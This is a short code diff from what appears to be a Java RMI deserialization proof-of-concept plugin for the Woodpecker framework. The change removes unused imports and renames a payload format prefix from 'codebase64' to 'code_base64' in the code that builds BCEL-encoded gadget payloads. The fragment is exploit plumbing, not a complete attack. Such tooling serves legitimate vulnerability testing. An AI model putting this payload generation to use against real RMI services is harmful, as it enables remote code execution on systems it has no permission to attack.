@@ -4,8 +4,6 @@ import me.gv7.woodpecker.plugin.*;
 import me.gv7.woodpecker.plugin.utils.CommonUtil;
 import me.gv7.woodpecker.plugin.utils.RMIRegistryExploit;
 import sun.misc.BASE64Encoder;
-import java.util.List;
-import java.util.Map;
 
 import static me.gv7.woodpecker.plugin.JavaRMIVulPlugin.gadgets;
 
@@ -22,7 +20,7 @@ public class RmiDeserialPoc implements IPoc {
             bcelStr = new BASE64Encoder().encode(bcelStr.getBytes());
             String result = null;
             try{
-                Object objPayload = CommonUtil.generator(gadget,String.format("codebase64:%s",bcelStr));
+                Object objPayload = CommonUtil.generator(gadget,String.format("code_base64:%s",bcelStr));
                 if(objPayload == null){
                     continue;
                 }
